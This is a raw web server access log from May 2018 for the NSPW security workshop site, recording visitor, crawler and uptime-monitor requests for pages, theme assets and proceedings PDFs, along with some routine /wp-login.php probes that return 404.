12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:16 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
12.162.204.2 - - [03/May/2018:11:22:37 -0400] "-" 408 3408 "-" "-"
69.162.124.227 - - [03/May/2018:11:22:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.146 - - [03/May/2018:11:24:17 -0400] "GET /2006/?C=S;O=D HTTP/1.1" 200 7999 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
34.234.87.24 - - [03/May/2018:11:25:01 -0400] "GET /2018 HTTP/1.1" 206 6744 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"
34.239.107.223 - - [03/May/2018:11:25:01 -0400] "GET /favicon.ico HTTP/1.1" 404 3887 "https://slack.com" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"
105.156.40.217 - - [03/May/2018:11:25:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.156.40.217 - - [03/May/2018:11:25:29 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
50.0.91.132 - - [03/May/2018:11:27:08 -0400] "GET /proceedings HTTP/1.1" 200 6190 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
50.0.91.132 - - [03/May/2018:11:27:34 -0400] "GET /past HTTP/1.1" 200 3129 "https://www.nspw.org/proceedings" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
88.172.153.160 - - [03/May/2018:11:27:37 -0400] "GET /wp-login.php HTTP/1.1" 404 7495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.172.153.160 - - [03/May/2018:11:27:38 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
50.0.91.132 - - [03/May/2018:11:27:41 -0400] "GET /2017 HTTP/1.1" 200 3809 "https://www.nspw.org/past" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
66.249.92.157 - - [03/May/2018:11:27:42 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf&amp HTTP/1.1" 404 8117 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.71 Safari/537.36"
66.249.92.155 - - [03/May/2018:11:27:43 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189194 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.71 Safari/537.36"
69.162.124.227 - - [03/May/2018:11:27:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
50.0.91.132 - - [03/May/2018:11:28:01 -0400] "GET /2017/cfp HTTP/1.1" 200 5733 "https://www.nspw.org/2017" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
50.0.91.132 - - [03/May/2018:11:28:36 -0400] "GET /2018/dates HTTP/1.1" 200 3030 "https://www.nspw.org/2017/cfp" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
50.0.91.132 - - [03/May/2018:11:29:08 -0400] "GET /proceedings HTTP/1.1" 200 3104 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
69.162.124.227 - - [03/May/2018:11:32:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
182.176.123.34 - - [03/May/2018:11:32:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
182.176.123.34 - - [03/May/2018:11:32:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.66.91 - - [03/May/2018:11:35:24 -0400] "GET /papers/1998/nspw1998-abrams.pdf HTTP/1.1" 200 734998 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [03/May/2018:11:37:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
185.38.125.167 - - [03/May/2018:11:38:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.38.125.167 - - [03/May/2018:11:38:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [03/May/2018:11:41:00 -0400] "GET /papers/2009/nspw2009-peisert.pdf HTTP/1.1" 200 1015650 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [03/May/2018:11:42:15 -0400] "GET /papers/2009/nspw2009-tuerpe.pdf HTTP/1.1" 200 375605 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [03/May/2018:11:42:34 -0400] "GET /papers/2009/?C=M;O=D HTTP/1.1" 200 968 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [03/May/2018:11:42:38 -0400] "GET /papers/2009/?C=D;O=D HTTP/1.1" 200 965 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [03/May/2018:11:42:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [03/May/2018:11:44:32 -0400] "GET /2005/submission.shtml HTTP/1.1" 200 5597 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
119.155.49.165 - - [03/May/2018:11:45:10 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
119.155.49.165 - - [03/May/2018:11:45:12 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.23.174.51 - - [03/May/2018:11:46:41 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
77.88.47.40 - - [03/May/2018:11:41:53 -0400] "GET /papers/2009/nspw2009-tuerpe.pdf HTTP/1.1" 200 173352 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [03/May/2018:11:47:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
107.21.1.8 - - [03/May/2018:11:48:41 -0400] "GET / HTTP/1.1" 200 6441 "https://www.nspw.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.21.1.8 - - [03/May/2018:11:48:41 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.21.1.8 - - [03/May/2018:11:48:41 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
77.88.47.40 - - [03/May/2018:11:50:25 -0400] "GET /2002/dates.content HTTP/1.1" 200 4353 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [03/May/2018:11:50:27 -0400] "GET /node/13 HTTP/1.1" 200 3229 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
131.100.79.10 - - [03/May/2018:11:51:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
131.100.79.10 - - [03/May/2018:11:51:24 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
199.16.157.182 - - [03/May/2018:11:51:44 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
176.88.29.88 - - [03/May/2018:11:51:51 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
176.88.29.88 - - [03/May/2018:11:51:53 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [03/May/2018:11:52:14 -0400] "GET /2006/past.shtml HTTP/1.1" 200 5613 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [03/May/2018:11:52:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [03/May/2018:11:53:03 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.200 - - [03/May/2018:11:53:56 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.66.93 - - [03/May/2018:11:55:09 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 5928 "-" "Googlebot-Image/1.0"
180.76.15.150 - - [03/May/2018:11:57:37 -0400] "GET /node/73 HTTP/1.1" 200 17211 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [03/May/2018:11:57:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.66.91 - - [03/May/2018:11:58:24 -0400] "GET /papers/1993/nspw1993-michael.pdf HTTP/1.1" 200 642526 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
60.254.81.232 - - [03/May/2018:11:59:20 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
60.254.81.232 - - [03/May/2018:11:59:21 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.209.226.141 - - [03/May/2018:12:00:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.209.226.141 - - [03/May/2018:12:00:06 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:02:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
123.125.67.164 - - [03/May/2018:12:02:59 -0400] "GET /robots.txt HTTP/1.1" 200 5923 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
35.232.100.166 - - [03/May/2018:12:05:01 -0400] "GET /robots.txt HTTP/1.1" 200 4496 "-" "ltx71 - (http://ltx71.com/)"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /2018 HTTP/1.1" 200 6755 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 888 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1167 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1727 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 647 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 741 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:25 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:06:26 -0400] "GET /favicon.ico HTTP/1.1" 404 3947 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
185.190.241.195 - - [03/May/2018:12:06:51 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.190.241.195 - - [03/May/2018:12:06:52 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:12:07:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.62.65.10 - - [03/May/2018:12:09:49 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 713338 "-" "Mozilla/4.0 (compatible;)"
194.62.65.10 - - [03/May/2018:12:09:49 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712039 "https://www.google.co.uk/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.64"
66.249.66.93 - - [03/May/2018:12:10:49 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 200 572187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
122.177.54.157 - - [03/May/2018:12:11:28 -0400] "GET / HTTP/1.1" 200 6460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1"
207.46.13.59 - - [03/May/2018:12:11:31 -0400] "GET /2016 HTTP/1.1" 200 7442 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
122.177.54.157 - - [03/May/2018:12:11:31 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3976 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:31 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:32 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:32 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:32 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:33 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:33 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:34 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:34 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.54.157 - - [03/May/2018:12:11:34 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
77.88.47.40 - - [03/May/2018:12:11:56 -0400] "GET /papers/2004/nspw2004-popescu.pdf HTTP/1.1" 200 131393 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
40.77.167.134 - - [03/May/2018:12:12:32 -0400] "GET /papers/2000/nspw2000-foley.pdf HTTP/1.1" 200 591510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [03/May/2018:12:12:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
198.128.221.165 - - [03/May/2018:12:13:50 -0400] "GET /past HTTP/1.1" 200 6241 "https://www.nspw.org/2018" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
77.88.47.40 - - [03/May/2018:12:13:19 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712053 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
198.128.221.165 - - [03/May/2018:12:13:59 -0400] "GET /2017 HTTP/1.1" 200 3797 "https://www.nspw.org/past" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
198.128.221.165 - - [03/May/2018:12:14:12 -0400] "GET /2017/program HTTP/1.1" 200 4092 "https://www.nspw.org/2017" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
77.88.47.40 - - [03/May/2018:12:14:16 -0400] "GET /papers/1994/nspw1994-lincoln.pdf HTTP/1.1" 200 353423 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
